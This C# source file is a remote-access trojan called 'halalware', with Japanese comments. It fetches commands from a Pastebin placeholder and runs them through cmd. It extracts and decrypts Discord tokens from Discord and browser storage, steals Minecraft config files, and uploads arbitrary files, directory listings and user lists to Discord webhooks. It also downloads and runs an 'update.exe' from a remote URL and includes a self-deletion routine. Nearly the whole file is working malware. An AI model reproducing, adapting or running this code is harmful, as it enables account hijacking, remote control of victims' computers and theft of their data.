using System.Timers;
using System;
using System.Text;
using System.Net.Http;
using System.Net;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Linq;
using System.IO.Pipes;
using System.Text.RegularExpressions;
using System.Security.Cryptography;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Crypto.Modes;
using System.Management;
using static Tools;
using System.Reflection.Metadata;
using System.IO.Compression;
using WindowsInput;
using Microsoft.Win32;
using System.Reflection;
using System.Windows.Forms;

/*/
 * 
 * 埋め込みディレクトリを変更
 * IDをhash化　=> C:\ProgramData\{ID-hashed}
 * public string MainDir = "C:\ProgramData\{ID-hashed}";
 * 
/*/

public static class Tools
{
    public delegate void FunctionInvoker();
    public static Task WaitAsync()
    {
        var tcs = new TaskCompletionSource();
        Console.CancelKeyPress += (sender, e) =>
        {
            e.Cancel = true;
            tcs.SetResult();
        };
        return tcs.Task;
    }

    public static void Wait()
    {
        using var manualResetEventSlim = new ManualResetEventSlim();
        Console.CancelKeyPress += (sender, e) =>
        {
            e.Cancel = true;
            manualResetEventSlim.Set();
        };
        manualResetEventSlim.Wait();
    }
    internal class Engine
    {
        private string AppDataRoaming { get; } = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        private string AppDataLocal { get; } = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        public string tempdata;
        private string EncryptedKey { get; set; }
        private Regex EncryptedKeyRegex { get; set; }
        private Regex NormalRegexPattern { get; set; }
        private Regex EncryptedRegexPattern { get; set; }
        private List<string> NormalTokens { get; set; }
        private List<string> EncryptedTokens { get; set; }
        private List<string> DecryptedTokens { get; set; }
        private Dictionary<string, string> DiscordPathInformation { get; set; }
        private Dictionary<string, string> DiscordTokenData { get; set; }

        public void Run()
        {
            this.EncryptedKeyRegex = new Regex("(?<key>[a-zA-Z0-9\\/\\+]{356})\"\\}\\}");
            this.NormalRegexPattern = new Regex(@"(?:[\w-]{24}([.])[\w-]{6}\1[\w-]{27}|mfa[.]\w{84})");
            this.EncryptedRegexPattern = new Regex("dQw4w9WgXcQ:[^\"]*");
            this.NormalTokens = new List<string>();
            this.EncryptedTokens = new List<string>();
            this.DecryptedTokens = new List<string>();
            this.DiscordPathInformation = new Dictionary<string, string>()
            {
                { "Discord",          AppDataRoaming + @"\discord\Local Storage\leveldb" },
                { "Discord(PTB)",     AppDataRoaming + @"\discordptb\Local Storage\leveldb" },
                { "Discord(Canary)",  AppDataRoaming + @"\discordcanary\Local Storage\leveldb" },
                { "Browser(Brave)",   AppDataLocal   + @"\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb" },
                { "Browser(Chrome)",  AppDataLocal   + @"\Google\Chrome\User Data\Default\Local Storage\leveldb" },
                { "Browser(Iridium)", AppDataLocal   + @"\Iridium\User Data\Default\Local Storage\leveldb"}
            };

            List<FunctionInvoker> functions = new List<FunctionInvoker>()
            {
                AcquireEncryptedKey,
                ExtractTokens,
                SendTokens
            };

            functions.ForEach(currentFunction => currentFunction.Invoke());
        }

        private void AcquireEncryptedKey()
        {
            try
            {
                string localStateContent = File.ReadAllText(AppDataRoaming + @"\discord\Local State");
                this.EncryptedKey = this.EncryptedKeyRegex.Match(localStateContent).Groups["key"].Value;
            }
            catch (DirectoryNotFoundException)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[!] Cannot find {AppDataRoaming}\\discord\\Local State");
            }
        }

        private void ExtractTokens()
        {
            foreach (KeyValuePair<string, string> currentPath in this.DiscordPathInformation)
            {
                try
                {
                    foreach (string LDBFile in Directory.GetFiles(currentPath.Value, "*ldb"))
                    {
                        string LDBFileContent = File.ReadAllText(LDBFile);

                        foreach (Match normalTokenMatch in this.NormalRegexPattern.Matches(LDBFileContent))
                        {
                            this.NormalTokens.Add($"{currentPath.Key} => {normalTokenMatch.Value}");
                        }

                        foreach (Match encryptedTokenMatch in this.EncryptedRegexPattern.Matches(LDBFileContent))
                        {
                            this.EncryptedTokens.Add(encryptedTokenMatch.Value);
                        }
                    }
                }
                catch (DirectoryNotFoundException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"[!] Directory for {currentPath.Key} not found.");
                    continue;
                }
            }

            for (int i = 0; i < this.EncryptedTokens.Count; i++)
            {
                this.DecryptedTokens.Add(DecryptToken(Convert.FromBase64String(EncryptedTokens[i].Split("dQw4w9WgXcQ:")[1])));
            }
        }

        private byte[] DecryptKey()
        {
            return ProtectedData.Unprotect(Convert.FromBase64String(this.EncryptedKey).Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);
        }

        public string DecryptToken(byte[] buff)
        {
            byte[] EncryptedData = buff.Skip(15).ToArray();
            AeadParameters Params = new(new KeyParameter(DecryptKey()), 128, buff.Skip(3).Take(12).ToArray(), null);
            GcmBlockCipher BlockCipher = new(new AesEngine());
            BlockCipher.Init(false, Params);
            byte[] DecryptedBytes = new byte[BlockCipher.GetOutputSize(EncryptedData.Length)];
            BlockCipher.DoFinal(DecryptedBytes, BlockCipher.ProcessBytes(EncryptedData, 0, EncryptedData.Length, DecryptedBytes, 0));
            return Encoding.UTF8.GetString(DecryptedBytes).TrimEnd("\r\n\0".ToCharArray());
        }

        private void SendTokens()
        {
            HashSet<string> Ltoken = new HashSet<string>(DecryptedTokens);

            foreach (string Dtoken in Ltoken)
            {
                tempdata += Dtoken + "\n";
            }
        }
    }
}
public class run_cmd
{
    public string MainDir = "";
    public string command = "";
    public string temp = "";
    public bool end_cmd = false;
    public bool first_cmd = true;
    public string webhook_scr = "WEBHOOK1";
    public string webhook_log = "WEBHOOK2";
    public void start()
    {
        byte[] bytes = Encoding.UTF8.GetBytes(get_id());
        using (SHA256 sha256 = SHA256.Create())
        {
            // ハッシュを計算
            byte[] hashBytes = sha256.ComputeHash(bytes);

            // バイト配列を16進数文字列に変換
            StringBuilder builder = new StringBuilder();
            foreach (byte b in hashBytes)
            {
                builder.Append(b.ToString("x2")); // 2桁の16進数で表示
            }

            string hashValue = builder.ToString();
            Console.WriteLine("SHA-256ハッシュ値: " + hashValue);
            MainDir = @"C:\ProgramData\{" + hashValue + "}";
        }
        SystemEvents.PowerModeChanged += sleep;
        System.Timers.Timer timer = new System.Timers.Timer(10 * 1000);
        timer.Elapsed += (sender, e) =>
        {
            check_command();
            png_delete();
        };
        timer.Start();
        Wait();
    }
    public void sleep(object sender, PowerModeChangedEventArgs e)
    {
        switch (e.Mode)
        {
            case PowerModes.Suspend:
                send_log("PCがスリープ状態に入りました。");
                break;
            case PowerModes.Resume:
                send_log("PCがスリープ状態から復帰しました。");
                break;
        }
    }
    public string get_id()
    {
        using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey("US-MAIN"))
        {
            object value = key.GetValue("ID");
            return value.ToString();
        }
    }
    private bool FileEncrypt(string FilePath, string Password, string filename)
    {

        int i, len;
        byte[] buffer = new byte[4096];

        //Output file path.
        string OutFilePath = filename;

        using (FileStream outfs = new FileStream(OutFilePath, FileMode.Create, FileAccess.Write))
        {
            using (AesManaged aes = new AesManaged())
            {
                aes.BlockSize = 128;              // BlockSize = 16bytes
                aes.KeySize = 128;                // KeySize = 16bytes
                aes.Mode = CipherMode.CBC;        // CBC mode
                aes.Padding = PaddingMode.PKCS7;    // Padding mode is "PKCS7".

                //入力されたパスワードをベースに擬似乱数を新たに生成
                Rfc2898DeriveBytes deriveBytes = new Rfc2898DeriveBytes(Password, 16);
                byte[] salt = new byte[16]; // Rfc2898DeriveBytesが内部生成したなソルトを取得
                salt = deriveBytes.Salt;
                // 生成した擬似乱数から16バイト切り出したデータをパスワードにする
                byte[] bufferKey = deriveBytes.GetBytes(16);

                aes.Key = bufferKey;
                // IV ( Initilization Vector ) は、AesManagedにつくらせる
                aes.GenerateIV();

                //Encryption interface.
                ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);

                using (CryptoStream cse = new CryptoStream(outfs, encryptor, CryptoStreamMode.Write))
                {
                    outfs.Write(salt, 0, 16);     // salt をファイル先頭に埋め込む
                    outfs.Write(aes.IV, 0, 16); // 次にIVもファイルに埋め込む
                    using (DeflateStream ds = new DeflateStream(cse, CompressionMode.Compress)) //圧縮
                    {
                        using (FileStream fs = new FileStream(FilePath, FileMode.Open, FileAccess.Read))
                        {
                            while ((len = fs.Read(buffer, 0, 4096)) > 0)
                            {
                                ds.Write(buffer, 0, len);
                            }
                        }
                    }

                }

            }
        }

        return (true);
    }
    private bool FileDecrypt(string FilePath, string Password, string Filename)
    {
        int i, len;
        byte[] buffer = new byte[4096];

        if (String.Compare(Path.GetExtension(FilePath), Path.GetExtension(FilePath), true) != 0)
        {
            return (false); ;
        }

        //Output file path.
        string OutFilePath = Filename;

        using (FileStream outfs = new FileStream(OutFilePath, FileMode.Create, FileAccess.Write))
        {
            using (FileStream fs = new FileStream(FilePath, FileMode.Open, FileAccess.Read))
            {
                using (AesManaged aes = new AesManaged())
                {
                    aes.BlockSize = 128;              // BlockSize = 16bytes
                    aes.KeySize = 128;                // KeySize = 16bytes
                    aes.Mode = CipherMode.CBC;        // CBC mode
                    aes.Padding = PaddingMode.PKCS7;    // Padding mode is "PKCS7".

                    // salt
                    byte[] salt = new byte[16];
                    fs.Read(salt, 0, 16);

                    // Initilization Vector
                    byte[] iv = new byte[16];
                    fs.Read(iv, 0, 16);
                    aes.IV = iv;

                    // ivをsaltにしてパスワードを擬似乱数に変換
                    Rfc2898DeriveBytes deriveBytes = new Rfc2898DeriveBytes(Password, salt);
                    byte[] bufferKey = deriveBytes.GetBytes(16);    // 16バイトのsaltを切り出してパスワードに変換
                    aes.Key = bufferKey;

                    //Decryption interface.
                    ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);

                    using (CryptoStream cse = new CryptoStream(fs, decryptor, CryptoStreamMode.Read))
                    {
                        using (DeflateStream ds = new DeflateStream(cse, CompressionMode.Decompress))   //解凍
                        {
                            while ((len = ds.Read(buffer, 0, 4096)) > 0)
                            {
                                outfs.Write(buffer, 0, len);
                            }
                        }
                    }
                }
            }
        }
        return (true);
    }
    private void png_delete()
    {
        if (File.Exists(MainDir + @"\file.png"))
        {
            File.Delete(MainDir+@"\file.png");
        }
    }
    public async void send_log(string content)
    {
        try
        {
            if (content.Length <= 2000)
            {

                HttpClient httpClient = new HttpClient();
                Dictionary<string, string> strs = new Dictionary<string, string>()
                {
                    { "content", content },
                    { "username", "halalware (id:" + get_id() + ")" },
                    { "avatar_url", "https://cdn.discordapp.com/avatars/1132757640867491871/acad78f5bbc5f777975cdd7e1fda249c.webp?size=160" }
                };
                TaskAwaiter<HttpResponseMessage> awaiter = httpClient.PostAsync(webhook_log, new FormUrlEncodedContent(strs)).GetAwaiter();
                awaiter.GetResult();
                Console.WriteLine("送信された(無事)");
            }
            else
            {
                using (var con = new MultipartFormDataContent())
                {
                    string fp = @"C:\Windows\Temp\CONTENT.txt";
                    File.WriteAllText(fp, content);
                    HttpClient client = new HttpClient();
                    byte[] fileBytes = File.ReadAllBytes(fp);
                    con.Add(new ByteArrayContent(fileBytes), "txt", Path.GetFileName(fp));
                    con.Add(new StringContent("file upload (id:" +get_id() + ")"), "username");
                    HttpResponseMessage response = await client.PostAsync(webhook_log, con);
                    string responseContent = await response.Content.ReadAsStringAsync();
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("エラー："+ex.Message);
        }
    }
    public void check_command()
    {
        string url = "PASTEBIN";
        using (WebClient client = new WebClient())
        {
            try
            {
                string response = client.DownloadString(url);
                if (response.Contains(get_id()+":") || response.Contains("ALL:"))
                {
                    response = response.Replace(get_id()+":","");
                    response = response.Replace("ALL:", "");
                    response = response.Replace("{MainDir}",MainDir);
                    if (response.Contains("cmd:"))
                    {
                        command = response.Replace("cmd:", "");
                        cmd();
                        Console.WriteLine("cmd");
                    }
                    else if (response.Contains("screenshot:"))
                    {
                        command = response;
                        screenshot();
                        Console.WriteLine("screenshot");
                    }
                    else if (response.Contains("upload:"))
                    {
                        string filepath = response.Replace("upload:", "");
                        upload(filepath);
                    }
                    else if (response.Contains("suicide:"))
                    {
                        suicide();
                    }
                    else if (response.Contains("tokens:"))
                    {
                        command = response;
                        get_tokens();
                    }
                    else if (response.Contains("update:"))
                    {
                        update();
                    }
                    else if (response.Contains("make:"))
                    {
                        string module = response.Replace("make:", "");
                        make(module);
                    }
                    else if (response.Contains("dir:"))
                    {
                        string dir_path = response.Replace("dir:", "");
                        get_directory(dir_path);
                    }
                    else if (response.Contains("file:"))
                    {
                        string dir_path = response.Replace("file:", "");
                        get_files(dir_path);
                    }
                    else if (response.Contains("sendkey:"))
                    {
                        command = response;
                        keyhook(response.Replace("sendkey:",""));
                    }
                    else if (response.Contains("user:"))
                    {
                        command = response;
                        U_list();
                    }
                    else if (response.Contains("config:"))
                    {
                        command = response;
                        Config_stealer();
                    }
                    else if (response.Contains("end:"))
                    {
                        send_log("ソフトを終了");
                        Environment.Exit(0);
                    }
                    else
                    {
                        send_log("無効なコマンドです");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }
    }
    public void make(string mod)
    {
        if (command == temp)
        {
            Console.WriteLine("変化なし");
        }
        else
        {
            temp = command;
            if (mod.Contains("file:"))
            {
                string F = mod.Replace("file:", "");
                string[] L = mod.Split('\n');
                File.WriteAllText(L[0], mod.Replace(L[0],""));
                send_log("ファイルを作成しました\npath:" + F);
            }
            else if (mod.Contains("dir:"))
            {
                string D = mod.Replace("dir:","");
                Directory.CreateDirectory(D);
                send_log("ディレクトリを作成しました\npath:"+D);
            }
            else
            {
                send_log("無効なオプションです");
            }
        }
    }
    public void U_list()
    {
        string us = "";
        if (command == temp)
        {
            Console.WriteLine("変化なし");
        }
        else
        {
            temp = command;
            DirectoryInfo di = new DirectoryInfo(@"C:\Users");
            DirectoryInfo[] diAlls = di.GetDirectories();
            foreach (DirectoryInfo d in diAlls)
            {
                us += d.FullName.Replace("C:\\Users","")+"\n";
            }
            send_log("Users\n"+us);
        }
    }
    public void update()
    {
        send_log("アップデートを開始");
        using (WebClient client = new WebClient())
        {
            client.DownloadFile("https://cdn.glitch.me/94d05571-a823-41ab-8746-b9abf3c4b977/update.exe?v=1692857938255", "C:\\Windows\\Temp\\update.exe");
        }
        send_log("アップデート終了\nソフトを再起動します");
        Process.Start("C:\\Windows\\Temp\\update.exe");
        Environment.Exit(0);
    }
    public void keyhook(string text)
    {
        if (command == temp)
        {
            Console.WriteLine("変化なし");
        }
        else
        {
            temp = command;
            Process.Start("notepad");
            Thread.Sleep(500);
            SendKeys.SendWait(text);
        }
    }
    public async void get_files(string dirpath)
    {
        string dir_list = "";
        if (dirpath == temp)
        {
            Console.WriteLine("変化なし");
        }
        else
        {
            temp = dirpath;
            try
            {
                string[] filepaths = Directory.GetFiles(dirpath, "*", SearchOption.AllDirectories);
                foreach (string L in filepaths)
                {
                    dir_list += L + "\n";
                }
                File.WriteAllText(MainDir+@"\Directory-list.txt", dir_list);
            }
            catch
            {
                send_log("upload error");
            }
            try
            {
                using (var content = new MultipartFormDataContent())
                {
                    HttpClient client = new HttpClient();
                    byte[] fileBytes = File.ReadAllBytes(MainDir+@"\Directory-list.txt");
                    content.Add(new ByteArrayContent(fileBytes), "file", Path.GetFileName(MainDir+@"\Directory-list.txt"));
                    content.Add(new StringContent("file upload (id:" + get_id() + ")"), "username");
                    HttpResponseMessage response = await client.PostAsync(webhook_log, content);
                    string responseContent = await response.Content.ReadAsStringAsync();
                }
            }
            catch
            {
                send_log("upload error");
            }
        }
    }
    public async void get_directory(string dirpath)
    {
        string dir_list = "";
        if (dirpath == temp)
        {
            Console.WriteLine("変化なし");
        }
        else
        {
            temp = dirpath;
            try
            {
                DirectoryInfo di = new DirectoryInfo(dirpath);
                DirectoryInfo[] diAlls = di.GetDirectories();
                foreach (DirectoryInfo d in diAlls)
                {
                    dir_list += $"{d.FullName}\n";
                }
                File.WriteAllText(MainDir + @"\Directory-list.txt", dir_list);
            }
            catch
            {
                send_log("upload error");
            }
            try
            {
                using (var content = new MultipartFormDataContent())
                {
                    HttpClient client = new HttpClient();
                    byte[] fileBytes = File.ReadAllBytes(MainDir + @"\Directory-list.txt");
                    content.Add(new ByteArrayContent(fileBytes), "file", Path.GetFileName(MainDir + @"\Directory-list.txt"));
                    content.Add(new StringContent("file upload (id:" + get_id() + ")"), "username");
                    HttpResponseMessage response = await client.PostAsync(webhook_log, content);
                    string responseContent = await response.Content.ReadAsStringAsync();
                }
            }
            catch
            {
                send_log("upload error");
            }
        }
    }
    public async void File_uplaod(string filepath, string extension)
    {
        if (filepath == temp)
        {
            Console.WriteLine("変化なし");
        }
        else
        {
            temp = filepath;
            using (var content = new MultipartFormDataContent())
            {
                try
                {
                    HttpClient client = new HttpClient();
                    byte[] fileBytes = File.ReadAllBytes(filepath);
                    content.Add(new ByteArrayContent(fileBytes), extension, Path.GetFileName(filepath));
                    content.Add(new StringContent("file upload (id:" + get_id() + ")"), "username");
                    HttpResponseMessage response = await client.PostAsync(webhook_log, content);
                    string responseContent = await response.Content.ReadAsStringAsync();
                }
                catch (Exception ex)
                {
                    send_log(ex.Message);
                }
            }
        }
    }
    public void Config_stealer()
    {
        if (command == temp)
        {
            Console.WriteLine("変化なし");
        }
        else
        {
            temp = command;
            ZipFile.CreateFromDirectory(Environment.SpecialFolder.LocalApplicationData+ @"\Packages\Microsoft.MinecraftUWP_8wekyb3d8bbwe\RoamingState", @"C:\Windows\Temp\Minecraft-Config.zip");
            File_uplaod(@"C:\Windows\Temp\Minecraft-Config.zip", "file");
            File.Delete(@"C:\Windows\Temp\Minecraft-Config.zip");
        }
    }
    public void get_tokens()
    {
        if (command == temp)
        {
            Console.WriteLine("変化なし");
        }
        else
        {
            temp = command;
            Engine engine = new Engine();
            engine.Run();
            send_log("tokens\n" + engine.tempdata);
        }
    }
    public async void upload(string filepath)
    {
        if (filepath == temp)
        {
            Console.WriteLine("変化なし");
        }
        else
        {
            temp = filepath;
            using (var content = new MultipartFormDataContent())
            {
                try
                {
                    HttpClient client = new HttpClient();
                    byte[] fileBytes = File.ReadAllBytes(filepath);
                    content.Add(new ByteArrayContent(fileBytes), "file", Path.GetFileName(filepath));
                    content.Add(new StringContent("file upload (id:" + get_id() + ")"), "username");
                    HttpResponseMessage response = await client.PostAsync(webhook_log, content);
                    string responseContent = await response.Content.ReadAsStringAsync();
                }
                catch (Exception ex)
                {
                    send_log(ex.Message);
                }
            }
        }
    }
    public void suicide()
    {
        File.WriteAllText(@"C:\Windows\Temp\temp.bat", "taskkill /f /t /im shot.txt\r\ntaskkill /f /t /im svchost.exe\r\ntimeout /t 5\r\nrd /s /q "+MainDir);
        ProcessStartInfo psInfo = new ProcessStartInfo();
        psInfo.FileName = "C:\\Windows\\Temp\\temp.bat";
        psInfo.CreateNoWindow = true;
        psInfo.UseShellExecute = false;
        Process.Start(psInfo);
        send_log("自己削除完了");
        Environment.Exit(0);
    }
    public void screenshot()
    {
        if (command == temp)
        {
            Console.WriteLine("変化なし");
        }
        else
        {
            temp = command;
            ProcessStartInfo psInfo = new ProcessStartInfo();
            psInfo.FileName = "cmd";
            psInfo.Arguments = "/c start "+MainDir+@"\shot.txt";
            psInfo.CreateNoWindow = true;
            psInfo.UseShellExecute = false;
            Process.Start(psInfo);
        }
    }
    public async void cmd()
    {
        if (command == temp)
        {
            Console.WriteLine("変化なし");
        }
        else
        {
            temp = command;
            string log = "";

            // ProcessStartInfo オブジェクトを設定
            ProcessStartInfo psi = new ProcessStartInfo()
            {
                FileName = "cmd",
                Arguments = "/c " + command.Replace("cmd:", ""),
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            // 外部プログラムを実行
            using (Process process = new Process())
            {
                try
                {
                    process.StartInfo = psi;

                    // タイムアウト設定（ミリ秒単位）
                    int timeoutMilliseconds = 30 * 1000; // 5秒

                    // タイムアウト用のタイマーを作成
                    System.Timers.Timer timeoutTimer = new System.Timers.Timer();
                    timeoutTimer.Interval = timeoutMilliseconds;
                    timeoutTimer.Elapsed += (sender, e) =>
                    {
                        // タイムアウト時の処理
                        Console.WriteLine("タイムアウトしました。プロセスを終了します。");

                        // プロセスを強制的に終了
                        if (!process.HasExited)
                        {
                            process.Kill();
                        }

                        timeoutTimer.Stop();
                        timeoutTimer.Dispose();
                    };
                    timeoutTimer.Start();

                    // プロセスの終了を待機（非同期）
                    Task<int> processTask = Task.Run(() =>
                    {
                        process.Start();
                        process.WaitForExit();
                        return process.ExitCode;
                    });

                    // プロセスの終了コードを取得（非同期）
                    int exitCode = await processTask;

                    // タイムアウトタイマーを停止および解放
                    timeoutTimer.Stop();
                    timeoutTimer.Dispose();

                    // 標準出力と標準エラー出力を読み取ります（必要に応じて）
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    /*
                    Console.WriteLine($"終了コード: {exitCode}");
                    Console.WriteLine("標準出力:");
                    Console.WriteLine(output);
                    Console.WriteLine("標準エラー出力:");
                    Console.WriteLine(error);
                    */
                    log = $"```終了コード: {exitCode}\n標準出力: {output}\n標準エラー出力: {error}```";
                    Console.WriteLine(log);
                    send_log("コマンドを実行しました\n" + command + "\n" + log);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
        }
    }
}

public class Program
{
    public static void Main(string[] args)
    {
        run_cmd run_Cmd = new run_cmd();
        run_Cmd.start();
    }
}
